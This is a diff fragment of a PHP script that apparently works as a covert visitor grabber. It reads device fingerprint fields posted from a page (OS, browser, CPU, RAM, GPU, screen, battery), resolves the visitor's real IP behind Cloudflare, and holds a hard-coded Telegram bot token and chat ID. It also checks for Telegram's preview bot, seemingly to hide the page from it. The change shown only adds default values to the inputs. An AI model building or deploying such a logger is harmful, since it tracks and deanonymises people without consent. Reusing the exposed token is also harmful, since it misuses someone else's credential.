@@ -18,17 +18,17 @@ if (strpos($userAgent, 'TelegramBot') !== false ||
 $botToken = "8386009786:AAE9SInLbXAHOI5HDwm9ctMhDicP7yYmUUM"; 
 $chatId = "-1003598938463";     
 
-// Receive Data
-$os = $_POST['Os'];
-$ptf = $_POST['Ptf'];
-$brw = $_POST['Brw'];
-$cc = $_POST['Cc'];
-$ram = $_POST['Ram'];
-$ven = $_POST['Ven'];
-$ren = $_POST['Ren'];
-$ht = $_POST['Ht'];
-$wd = $_POST['Wd'];
-$bat = $_POST['Bat'] ?? "Unknown"; 
+// Receive Data (Safely)
+$os = $_POST['Os'] ?? 'Unknown';
+$ptf = $_POST['Ptf'] ?? 'Unknown';
+$brw = $_POST['Brw'] ?? 'Unknown';
+$cc = $_POST['Cc'] ?? 'Unknown';
+$ram = $_POST['Ram'] ?? 'Unknown';
+$ven = $_POST['Ven'] ?? 'Unknown'; 
+$ren = $_POST['Ren'] ?? 'Unknown'; 
+$ht = $_POST['Ht'] ?? 'Unknown';
+$wd = $_POST['Wd'] ?? 'Unknown';
+$bat = $_POST['Bat'] ?? "Unknown";
 
 // Get Real IP (Cloudflare support included)
 if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
